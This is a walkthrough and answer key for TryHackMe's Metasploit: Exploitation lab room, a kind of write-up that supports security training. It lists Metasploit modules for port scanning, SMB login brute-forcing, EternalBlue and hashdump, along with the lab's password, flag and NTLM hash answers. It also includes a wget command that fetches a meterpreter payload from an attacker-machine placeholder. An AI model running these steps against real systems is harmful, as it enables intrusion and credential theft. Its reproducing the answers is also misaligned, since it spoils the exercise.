![Metasploit: Exploitation Banner](https://assets.tryhackme.com/room-banners/metasploit.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Cover.png" alt="Metasploit: Exploitation Logo">
</p>

# Metasploit: Exploitation

This guide contains the answer and steps necessary to get to them for the [Metasploit: Exploitation](https://tryhackme.com/room/metasploitexploitation) room.

## Table of contents

- [Scanning](#scanning)
- [The Metasploit Database](#the-metasploit-database)
- [Vulnerability Scanning](#vulnerability-scanning)
- [Exploitation](#exploitation)
- [Msfvenom](#msfvenom)

### Scanning


1. How many ports are open on the target system?

   auxiliary/scanner/portscan/tcp
   
   SCANNING PORTSCAN

   ><details><summary>Click for answer</summary>5</details>

2. Using the relevant scanner, what NetBIOS name can you see?

   auxiliary/scanner/discovery/udp_sweep

   SCANNING NETBIOS

   ><details><summary>Click for answer</summary>ACME IT SUPPORT</details>

3. What is running on port 8000?

   nmap -sV 10.10.162.76

   SCANNING NMAP

   ><details><summary>Click for answer</summary>WebFS/1.21</details>

4. What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task. 

   auxiliary/scanner/smb/smb_login

   SCANNING SMB

   ><details><summary>Click for answer</summary>leo1234</details>

### The Metasploit Database

systemctl start postgresql
sudo msfdb init

DATABASE INITIALIZE

DATABASE MSF

db_status
workspace
workspace -a tryhackme
workspace default

DATABASE SCAN

db_nmap -p- 10.10.162.76

### Vulnerability Scanning


1. Who wrote the module that allows us to check SMTP servers for open relay?

   VULNERABILITY SMTP

   ><details><summary>Click for answer</summary>Campbell Murray</details>

### Exploitation


1. Exploit one of the critical vulnerabilities on the target VM

   EXPLOITATION HOST
   
   EXPLOITATION EXPLOITED
   
   exploit/windows/smb/ms17_010_eternalblue


2. What is the content of the flag.txt file?

   EXPLOITATION FLAG

   ><details><summary>Click for answer</summary>THM-5455554845</details>

3. What is the NTLM hash of the password of the user "pirate"?

   post/windows/gather/hashdump
   
   EXPLOITATION HASH

   ><details><summary>Click for answer</summary>8ce9a3ebd1647fcc5e04025019f4b875</details>

### Msfvenom



1. Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.

2. Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice).

3. Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_MACHINE_IP:9000/shell.elf to download it to the target machine).

4. Get a meterpreter session on the target machine.

5. Use a post exploitation module to dump hashes of other users on the system.

6. What is the other user's password hash?

   

   ><details><summary>Click for answer</summary></details>



